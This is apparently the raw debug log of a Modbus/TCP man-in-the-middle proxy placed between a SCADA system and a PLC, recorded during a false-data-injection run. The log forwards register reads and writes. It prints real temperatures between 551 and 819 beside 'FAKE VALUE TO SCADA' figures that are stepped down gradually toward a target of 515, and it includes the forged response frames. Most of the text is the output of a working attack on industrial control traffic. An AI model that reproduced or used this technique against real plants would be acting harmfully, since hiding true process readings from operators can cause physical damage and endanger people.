2025-12-25 16:04:38,320 DEBUG logging:103 SEND: 0x0 0x26 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3f 0x3 0xb 0x0 0x0
2025-12-25 16:04:38,320 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:04:38,320 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:04:38,321 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:04:38,321 DEBUG logging:103 RECV: 0x0 0x26 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:04:38,321 DEBUG logging:103 Processing: 0x0 0x26 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:04:38,321 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:04:38,321 DEBUG logging:103 Adding transaction 38
2025-12-25 16:04:38,321 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:38,321 DEBUG logging:103 Getting transaction 38
2025-12-25 16:04:38,321 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:04:38,321 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:38,322 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:04:38,322 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:04:38,322 DEBUG logging:103 send: 0x0 0x26 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:04:57,886 DEBUG logging:103 recv: 0x0 0x27 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:04:57,886 DEBUG logging:103 Handling data: 0x0 0x27 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:04:57,886 DEBUG logging:103 Processing: 0x0 0x27 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:04:57,886 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:04:57,886 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:04:57,886 DEBUG logging:103 Running transaction 39
2025-12-25 16:04:57,886 DEBUG logging:103 SEND: 0x0 0x27 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:04:57,886 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:04:57,886 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:04:57,888 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:04:57,888 DEBUG logging:103 RECV: 0x0 0x27 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3f 0x3 0xb 0x0 0x0
2025-12-25 16:04:57,888 DEBUG logging:103 Processing: 0x0 0x27 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3f 0x3 0xb 0x0 0x0
2025-12-25 16:04:57,888 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:04:57,888 DEBUG logging:103 Adding transaction 39
2025-12-25 16:04:57,888 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:57,888 DEBUG logging:103 Getting transaction 39
2025-12-25 16:04:57,889 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:04:57,889 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:04:57,889 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:04:57,889 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 779
[*] DELTA : -31.63
[*] Last value Reported to SCADA : 546.63
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 541.68
[*]==> FAKE VALUE TO SCADA: 541
2025-12-25 16:04:57,889 DEBUG logging:103 send: 0x0 0x27 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3f 0x2 0x1d 0x0 0x0
2025-12-25 16:05:08,322 DEBUG logging:103 recv: 0x0 0x28 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3d 0x2 0x27 0x0 0x0 old_data:  addr=None
2025-12-25 16:05:08,322 DEBUG logging:103 Handling data: 0x0 0x28 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3d 0x2 0x27 0x0 0x0
2025-12-25 16:05:08,322 DEBUG logging:103 Processing: 0x0 0x28 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3d 0x2 0x27 0x0 0x0
2025-12-25 16:05:08,323 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:05:08,323 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:05:08,323 DEBUG logging:103 Running transaction 40
2025-12-25 16:05:08,323 DEBUG logging:103 SEND: 0x0 0x28 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x3d 0x2 0x27 0x0 0x0
2025-12-25 16:05:08,323 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:05:08,323 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:05:08,324 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:05:08,324 DEBUG logging:103 RECV: 0x0 0x28 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:05:08,324 DEBUG logging:103 Processing: 0x0 0x28 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:05:08,324 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:05:08,324 DEBUG logging:103 Adding transaction 40
2025-12-25 16:05:08,324 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:08,324 DEBUG logging:103 Getting transaction 40
2025-12-25 16:05:08,324 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:05:08,324 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:08,324 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:05:08,324 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:05:08,324 DEBUG logging:103 send: 0x0 0x28 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:05:28,889 DEBUG logging:103 recv: 0x0 0x29 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:05:28,890 DEBUG logging:103 Handling data: 0x0 0x29 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:05:28,890 DEBUG logging:103 Processing: 0x0 0x29 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:05:28,890 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:05:28,890 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:05:28,890 DEBUG logging:103 Running transaction 41
2025-12-25 16:05:28,890 DEBUG logging:103 SEND: 0x0 0x29 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:05:28,890 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:05:28,890 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:05:28,892 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:05:28,892 DEBUG logging:103 RECV: 0x0 0x29 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3d 0x2 0x27 0x0 0x0
2025-12-25 16:05:28,892 DEBUG logging:103 Processing: 0x0 0x29 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3d 0x2 0x27 0x0 0x0
2025-12-25 16:05:28,892 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:05:28,892 DEBUG logging:103 Adding transaction 41
2025-12-25 16:05:28,892 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:28,892 DEBUG logging:103 Getting transaction 41
2025-12-25 16:05:28,892 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:05:28,893 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:28,893 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:05:28,893 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 551
[*] DELTA : -26.68
[*] Last value Reported to SCADA : 541.68
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 536.95
[*]==> FAKE VALUE TO SCADA: 536
2025-12-25 16:05:28,893 DEBUG logging:103 send: 0x0 0x29 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x3d 0x2 0x18 0x0 0x0
2025-12-25 16:05:38,332 DEBUG logging:103 recv: 0x0 0x2a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x34 0x3 0x31 0x0 0x1 old_data:  addr=None
2025-12-25 16:05:38,332 DEBUG logging:103 Handling data: 0x0 0x2a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x34 0x3 0x31 0x0 0x1
2025-12-25 16:05:38,333 DEBUG logging:103 Processing: 0x0 0x2a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x34 0x3 0x31 0x0 0x1
2025-12-25 16:05:38,333 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:05:38,333 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:05:38,333 DEBUG logging:103 Running transaction 42
2025-12-25 16:05:38,333 DEBUG logging:103 SEND: 0x0 0x2a 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x34 0x3 0x31 0x0 0x1
2025-12-25 16:05:38,333 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:05:38,333 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:05:38,334 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:05:38,334 DEBUG logging:103 RECV: 0x0 0x2a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:05:38,334 DEBUG logging:103 Processing: 0x0 0x2a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:05:38,334 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:05:38,334 DEBUG logging:103 Adding transaction 42
2025-12-25 16:05:38,334 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:38,334 DEBUG logging:103 Getting transaction 42
2025-12-25 16:05:38,334 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:05:38,334 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:38,335 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:05:38,335 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:05:38,335 DEBUG logging:103 send: 0x0 0x2a 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:05:59,894 DEBUG logging:103 recv: 0x0 0x2b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:05:59,894 DEBUG logging:103 Handling data: 0x0 0x2b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:05:59,894 DEBUG logging:103 Processing: 0x0 0x2b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:05:59,894 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:05:59,894 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:05:59,894 DEBUG logging:103 Running transaction 43
2025-12-25 16:05:59,894 DEBUG logging:103 SEND: 0x0 0x2b 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:05:59,894 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:05:59,895 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:05:59,896 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:05:59,896 DEBUG logging:103 RECV: 0x0 0x2b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x34 0x3 0x31 0x0 0x1
2025-12-25 16:05:59,896 DEBUG logging:103 Processing: 0x0 0x2b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x34 0x3 0x31 0x0 0x1
2025-12-25 16:05:59,896 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:05:59,896 DEBUG logging:103 Adding transaction 43
2025-12-25 16:05:59,896 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:59,896 DEBUG logging:103 Getting transaction 43
2025-12-25 16:05:59,896 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:05:59,896 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:05:59,896 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:05:59,896 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 817
[*] DELTA : -21.95
[*] Last value Reported to SCADA : 536.95
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 531.64
[*]==> FAKE VALUE TO SCADA: 531
2025-12-25 16:05:59,897 DEBUG logging:103 send: 0x0 0x2b 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x34 0x2 0x13 0x0 0x1
2025-12-25 16:06:08,334 DEBUG logging:103 recv: 0x0 0x2c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x1f 0x3 0x33 0x0 0x1 old_data:  addr=None
2025-12-25 16:06:08,334 DEBUG logging:103 Handling data: 0x0 0x2c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x1f 0x3 0x33 0x0 0x1
2025-12-25 16:06:08,334 DEBUG logging:103 Processing: 0x0 0x2c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x1f 0x3 0x33 0x0 0x1
2025-12-25 16:06:08,334 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:06:08,334 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:06:08,334 DEBUG logging:103 Running transaction 44
2025-12-25 16:06:08,335 DEBUG logging:103 SEND: 0x0 0x2c 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x1f 0x3 0x33 0x0 0x1
2025-12-25 16:06:08,335 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:06:08,335 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:06:08,336 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:06:08,336 DEBUG logging:103 RECV: 0x0 0x2c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:06:08,336 DEBUG logging:103 Processing: 0x0 0x2c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:06:08,336 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:06:08,336 DEBUG logging:103 Adding transaction 44
2025-12-25 16:06:08,336 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:06:08,336 DEBUG logging:103 Getting transaction 44
2025-12-25 16:06:08,336 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:06:08,336 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:06:08,337 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:06:08,337 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:06:08,337 DEBUG logging:103 send: 0x0 0x2c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:06:30,900 DEBUG logging:103 recv: 0x0 0x2d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:06:30,900 DEBUG logging:103 Handling data: 0x0 0x2d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:06:30,900 DEBUG logging:103 Processing: 0x0 0x2d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:06:30,901 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:06:30,901 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:06:30,901 DEBUG logging:103 Running transaction 45
2025-12-25 16:06:30,901 DEBUG logging:103 SEND: 0x0 0x2d 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:06:30,901 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:06:30,901 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:06:30,903 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:06:30,903 DEBUG logging:103 RECV: 0x0 0x2d 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x1f 0x3 0x33 0x0 0x1
2025-12-25 16:06:30,903 DEBUG logging:103 Processing: 0x0 0x2d 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x1f 0x3 0x33 0x0 0x1
2025-12-25 16:06:30,903 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:06:30,903 DEBUG logging:103 Adding transaction 45
2025-12-25 16:06:30,903 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:06:30,903 DEBUG logging:103 Getting transaction 45
2025-12-25 16:06:30,903 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:06:30,903 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:06:30,904 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:06:30,904 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 819
[*] DELTA : -16.64
[*] Last value Reported to SCADA : 531.64
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 526.94
[*]==> FAKE VALUE TO SCADA: 526
2025-12-25 16:06:30,904 DEBUG logging:103 send: 0x0 0x2d 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x1f 0x2 0xe 0x0 0x1
2025-12-25 16:06:38,339 DEBUG logging:103 recv: 0x0 0x2e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x23 0x3 0xf 0x0 0x0 old_data:  addr=None
2025-12-25 16:06:38,340 DEBUG logging:103 Handling data: 0x0 0x2e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x23 0x3 0xf 0x0 0x0
2025-12-25 16:06:38,340 DEBUG logging:103 Processing: 0x0 0x2e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x23 0x3 0xf 0x0 0x0
2025-12-25 16:06:38,340 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:06:38,340 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:06:38,340 DEBUG logging:103 Running transaction 46
2025-12-25 16:06:38,340 DEBUG logging:103 SEND: 0x0 0x2e 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x23 0x3 0xf 0x0 0x0
2025-12-25 16:06:38,340 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:06:38,340 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:06:38,341 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:06:38,341 DEBUG logging:103 RECV: 0x0 0x2e 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:06:38,341 DEBUG logging:103 Processing: 0x0 0x2e 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:06:38,341 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:06:38,341 DEBUG logging:103 Adding transaction 46
2025-12-25 16:06:38,342 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:06:38,342 DEBUG logging:103 Getting transaction 46
2025-12-25 16:06:38,342 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:06:38,342 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:06:38,342 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:06:38,342 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:06:38,342 DEBUG logging:103 send: 0x0 0x2e 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:07:01,904 DEBUG logging:103 recv: 0x0 0x2f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:07:01,905 DEBUG logging:103 Handling data: 0x0 0x2f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:07:01,905 DEBUG logging:103 Processing: 0x0 0x2f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:07:01,905 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:07:01,905 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:07:01,905 DEBUG logging:103 Running transaction 47
2025-12-25 16:07:01,905 DEBUG logging:103 SEND: 0x0 0x2f 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:07:01,905 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:07:01,905 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:07:01,907 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:07:01,907 DEBUG logging:103 RECV: 0x0 0x2f 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x23 0x3 0xf 0x0 0x0
2025-12-25 16:07:01,907 DEBUG logging:103 Processing: 0x0 0x2f 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x23 0x3 0xf 0x0 0x0
2025-12-25 16:07:01,907 DEBUG logging:103 Factory Response[ReadHoldingRegistersResponse': 3]
2025-12-25 16:07:01,907 DEBUG logging:103 Adding transaction 47
2025-12-25 16:07:01,907 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:01,907 DEBUG logging:103 Getting transaction 47
2025-12-25 16:07:01,907 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:07:01,908 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:01,908 DEBUG logging:103 validate: fc-[3] address-15: count-3
2025-12-25 16:07:01,908 DEBUG logging:103 getValues: fc-[3] address-15: count-3
[*]=> Current temperature: 783
[*] DELTA : -11.94
[*] Last value Reported to SCADA : 526.94
[*] ALTERATION STARTED...
[*] TARGET VALUE : 515
[*] ALTERED VALUE to SCADA : 522.05
[*]==> FAKE VALUE TO SCADA: 522
2025-12-25 16:07:01,908 DEBUG logging:103 send: 0x0 0x2f 0x0 0x0 0x0 0x9 0x1 0x3 0x6 0x0 0x23 0x2 0xa 0x0 0x0
2025-12-25 16:07:08,341 DEBUG logging:103 recv: 0x0 0x30 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x45 0x2 0x46 0x0 0x1 old_data:  addr=None
2025-12-25 16:07:08,341 DEBUG logging:103 Handling data: 0x0 0x30 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x45 0x2 0x46 0x0 0x1
2025-12-25 16:07:08,341 DEBUG logging:103 Processing: 0x0 0x30 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x45 0x2 0x46 0x0 0x1
2025-12-25 16:07:08,341 DEBUG logging:103 Factory Request[WriteMultipleRegistersRequest': 16]
---> Forwarding REQUEST to PLC: WriteMultipleRegisterRequest 14 => 3
2025-12-25 16:07:08,341 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:07:08,341 DEBUG logging:103 Running transaction 48
2025-12-25 16:07:08,341 DEBUG logging:103 SEND: 0x0 0x30 0x0 0x0 0x0 0xd 0x1 0x10 0x0 0xe 0x0 0x3 0x6 0x0 0x45 0x2 0x46 0x0 0x1
2025-12-25 16:07:08,341 DEBUG logging:103 New Transaction state "SENDING"
2025-12-25 16:07:08,341 DEBUG logging:103 Changing transaction state from "SENDING" to "WAITING FOR REPLY"
2025-12-25 16:07:08,343 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:07:08,343 DEBUG logging:103 RECV: 0x0 0x30 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:07:08,343 DEBUG logging:103 Processing: 0x0 0x30 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:07:08,343 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:07:08,343 DEBUG logging:103 Adding transaction 48
2025-12-25 16:07:08,343 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:08,343 DEBUG logging:103 Getting transaction 48
2025-12-25 16:07:08,343 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:07:08,344 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:07:08,344 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:07:08,344 DEBUG logging:103 setValues[16] address-15: count-3
2025-12-25 16:07:08,344 DEBUG logging:103 send: 0x0 0x30 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:07:32,912 DEBUG logging:103 recv: 0x0 0x31 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3 old_data:  addr=None
2025-12-25 16:07:32,912 DEBUG logging:103 Handling data: 0x0 0x31 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:07:32,912 DEBUG logging:103 Processing: 0x0 0x31 0x0 0x0 0x0 0x6 0x1 0x3 0x0 0xe 0x0 0x3
2025-12-25 16:07:32,913 DEBUG logging:103 Factory Request[ReadHoldingRegistersRequest': 3]
---> Forwarding REQUEST to PLC: ReadHoldingRegistersRequest (14,3)
2025-12-25 16:07:32,913 DEBUG logging:103 Current transaction state - TRANSACTION_COMPLETE
2025-12-25 16:07:32,913 DEBUG logging:103 Running transaction 49
